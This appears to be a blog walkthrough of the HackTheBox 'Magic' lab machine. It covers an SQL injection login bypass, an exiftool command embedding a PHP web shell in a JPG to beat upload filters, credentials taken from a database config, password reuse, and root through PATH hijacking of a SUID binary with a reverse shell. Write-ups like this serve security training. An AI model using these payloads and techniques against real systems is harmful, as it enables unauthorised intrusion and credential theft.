---
title: Write-up Magic Machine
author: pcw3r
date: 2020-08-29 15:36:00 +0200
categories: [HackTheBox, Boot2Root]
tags: [LINUX, MEDIUM, ENUMERATION, DATABASE EXPLOITATION, SQL INJECTION, SUID BINARIES, PATH-ENVIRONMENT EXPLOITATION, PAYLOAD]
---

**<center>RefÂ°: HTB-14-Boot2Root</center>**

![Desktop View]({{ "/assets/img/magic/HTB-Badge-Magic.png" | relative_url }})

--- Magic is a medium level linux machine. It defined by sql injection to bypass the authentication of a login page and the exploitation of payload hidden in an image to gain our "foothold".

A lateral movement on the user theseus is possible through a leaked database and the presence in it of a password reused by this user.

Privilege elevation is achieved by exploiting the sysinfo binary and environment variables.


![Desktop View]({{ "/assets/img/magic/HTB-Information-Magic.png" | relative_url }})

## **<span style='color:#c0392b'>[1] Discovery - Figure out environment</span>**
### Network Service Scanning
***
Nmap scan reveal 2 services on her usual port :
* `ssh` on port 22
* `web` on port 80

```terminal
$ nmap -A -T5 10.10.10.185 -p-
```

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-nmap.png" | relative_url }})

### Website
***
We have portfolio website with possibility to see all pictures.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-website.png" | relative_url }})

And the capacity to `upload files` if we success to login.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-login_page.png" | relative_url }})

The login page is vulnerable to SQL Injection and we can bypass the authentication.

How we know that ?

Firstly, when we entered fake credential an error appear and present "Wrong Username or Password".

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-error_login.png" | relative_url }})

And when we entered only a single quote in to the "Username" field and submitted the request using the "Login" button, the error not appear.

This show us the website interprets this single quote and had potentially vulnerable to SQL Injection.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-injection_test.png" | relative_url }})

References - sql injection : <https://portswigger.net/support/using-sql-injection-to-bypass-authentication>

## **<span style='color:#c0392b'>[2] Foothold - Get into the target </span>**
### Bypassing Authentication with SQL Injection
***
Now, we used `' or 1=1 -- `

This causes the application to perform the query:

```
SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'foo'
```
Because the comment sequence (--) causes the remainder of the query to be ignored, this is equivalent to:

```
SELECT * FROM users WHERE username = ' ' OR 1=1
```

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-injection_bypass.png" | relative_url }})

And we got it! We able to upload images and gain foothold from this way.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-upload_page.png" | relative_url }})

### Obtaining Reverse Shell with Payload Injection
***
The condition to upload allowed files are only `JPG, JPEG and PNG` extensions.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-upload_condition.png" | relative_url }})

We use `exiftool` to embed the payload into the picture to bypass this condition.

```terminal
$ exiftool -Comment='<?php echo "<pre>"; system($_GET["cmd"]); _halt_compiler() ?>' minion.jpg
$ mv minion.jpg minion.php.jpg
```
We need to rename our file to `*.php.jpg` to bypass the restriction. Anyway the file is parsed as a PHP file and our payload is fully functional:

Upload the file :

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-upload_test.png" | relative_url }})

Payload execution :

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-exec_payload.png" | relative_url }})

Now we can use commands to control it with our web browser and leak for example `passwd` file.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-leak_passwd.png" | relative_url }})

We know the system user to exploit : `theseus`

But we must obtain reverse shell to perform lateral movement on this user.

We use an other PHP payload we can find from : <https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/> and proceed the same way.

We listening the correct port and get reverse shell by `www-data` :

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-nc_get_www-data.png" | relative_url }})

We gain finally our foothold.

## **<span style='color:#c0392b'>[3] Lateral Movement - Move through environment</span>**
### Plaintext Password from database
***
We have website, the first interesting enumeration we can be realize is on folder `/var/www/*`.

Retrieve database information under `db.php5` file :
* db name : `Magic`
* db host : `localhost`
* db username : `theseus`
* db password : `iamkingtheseus`

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-info_db.png" | relative_url }})

I find php file to perform backup database on localhost such as for example : <https://github.com/daniloaz/myphp-backup>

We retrieve the PHP file from Magic machine and execute to backup the database `Magic`.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-transfert_backup_php.png" | relative_url }})

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-backup_db.png" | relative_url }})

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-enum.png" | relative_url }})

We don't have the rights to retrieve the backup.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-error_get_db.png" | relative_url }})

To bypass this restriction, rename the backup file `sql.gz` to `jpg` file.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-mv_db1.png" | relative_url }})

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-grab_db.png" | relative_url }})

Once we grab the file, we rename correctly and open the database.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-mv_db2.png" | relative_url }})

The database reveal new password `Th3s3usW4sK1ng`.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-db_check.png" | relative_url }})

### Reusing Password
***

Theseus account reuse the same password.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-lateral_movement_theseus.png" | relative_url }})

### Flag user
***

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-flag_user.png" | relative_url }})

## **<span style='color:#c0392b'>[4] Privilege Escalation - Gain higher-level permissions</span>**
### Persistence with SSH Authorized Keys
***
To proceed more easily, I make my ssh connection more persistent.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-make_ssh_persistent.png" | relative_url }})

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-connect_ssh_theseus.png" | relative_url }})


### Setuid, Path Modification and Reverse Shell with Payload Injection
***
The enumeration reveal interesting binary `/bin/sysinfo`. The program run under root privilege but he can be launch by anybody from users group. Our account belongs to this group.

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-suid.png" | relative_url }})

This program launch many module like `fdisk`, `cpuinfo` or `lshw`.

We using path variable to escalate our privilege by creating a named file of one of these modules with our bash reverse shell.

We modify an environment variable in order to make one of the modules run using the following path : `/tmp/privuser/`

References - path environment : <https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/>

We listening on our local machine and execute sysinfo program on Magic machine.

### Flag root
***

![Desktop View]({{ "/assets/img/magic/HTB-Images-Magic-flag_root.png" | relative_url }})

Magic machine is compromised.

***

## **<center>Trophy</center>**

> **Any sufficiently advanced technology is indistinguishable from magic.**
>
> Arthur C. Clarke
